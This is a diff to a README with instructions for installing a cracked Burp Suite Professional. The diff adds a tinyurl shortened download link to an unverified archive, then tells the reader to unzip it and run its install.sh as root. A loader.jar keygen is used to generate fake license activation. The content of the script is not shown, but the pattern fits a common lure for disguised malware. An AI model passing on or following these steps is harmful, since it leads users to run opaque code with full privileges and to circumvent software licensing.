@@ -2,6 +2,8 @@
 
 This repository contains step-by-step instructions and video walkthrough references for setting up and running **Burp Suite Professional (v2026.x)**.
 
+> 📦 **Download Setup Package:** [tinyurl.com/burpsuitepro2026](https://tinyurl.com/burpsuitepro2026)
+
 ---
 
 ## 1. How to Downgrade & Configure Java Version (Video Walkthrough 1)
@@ -66,19 +68,28 @@ https://github.com/user-attachments/assets/84da740c-71e6-4eeb-8562-b2cf44c128cb
 
 ### Step-by-Step Instructions:
 
-#### Step 2.1: Switch to Root User
+#### Step 2.1: Download & Extract the Setup Package
+Download the setup file from:
+> 📥 **[https://tinyurl.com/burpsuitepro2026](https://tinyurl.com/burpsuitepro2026)**
+
+Extract the downloaded archive:
+```bash
+unzip BurpSuitePro-v2026.zip
+```
+
+#### Step 2.2: Switch to Root User
 Open your terminal and switch to the root user:
 ```bash
 sudo su
 ```
 
-#### Step 2.2: Navigate into the Folder
+#### Step 2.3: Navigate into the Folder
 Enter the directory containing the setup files:
 ```bash
 cd BurpSuitePro-v2026
 ```
 
-#### Step 2.3: Make `install.sh` Executable and Run
+#### Step 2.4: Make `install.sh` Executable and Run
 Grant execute permission to `install.sh` and execute it:
 ```bash
 chmod +x install.sh
@@ -86,19 +97,19 @@ chmod +x install.sh
 ```
 *This script installs dependencies, sets up the binary shortcut, and automatically opens both `loader.jar` and Burp Suite.*
 
-#### Step 2.4: Close Initial Burp Suite Window
+#### Step 2.5: Close Initial Burp Suite Window
 When Burp Suite launches and prompts for the license key / terms:
 - **Close the Burp Suite window.**
 - Keep `loader.jar` open.
 
-#### Step 2.5: Open a New Terminal Tab as Normal User
+#### Step 2.6: Open a New Terminal Tab as Normal User
 Open a **new terminal tab or window**, ensuring you are **NOT** on the root user (use your regular user account), then run:
 ```bash
 burpsuitepro
 ```
 Burp Suite will launch again under your normal user profile.
 
-#### Step 2.6: Complete Manual License Activation
+#### Step 2.7: Complete Manual License Activation
 1. In the **loader.jar** window, copy the generated **License**.
 2. Paste the license into the Burp Suite license screen and click **Next**.
 3. Select **Manual Activation**.
@@ -106,5 +117,5 @@ Burp Suite will launch again under your normal user profile.
 5. Copy the generated **Activation Response** from `loader.jar` and paste it back into Burp Suite.
 6. Click **Next** -> **Finish**.
 
-#### Step 2.7: Graphical Desktop Launcher
+#### Step 2.8: Graphical Desktop Launcher
 Refer to **Video Walkthrough 2** above for the visual guide on creating a desktop graphical application launcher icon for quick access.
